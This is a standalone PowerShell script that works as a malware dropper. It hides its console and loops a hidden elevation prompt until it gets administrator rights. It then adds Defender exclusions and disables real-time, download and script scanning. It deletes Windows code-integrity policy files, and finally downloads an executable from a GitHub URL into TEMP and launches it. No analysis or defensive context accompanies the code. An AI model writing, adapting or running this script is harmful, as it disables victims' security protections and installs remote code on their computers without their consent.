# Hide Console Window
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

# ============ ADMIN CHECK + ELEVATION LOOP ============
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    while ($true) {
        try {
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ============ ADD EXCLUSIONS (TEMP + EXE) ============
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b"
Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b"
Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b"
Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse

# ============ DOWNLOAD + RUN EXE ============
$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
$out = Join-Path $env:TEMP "Comand.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
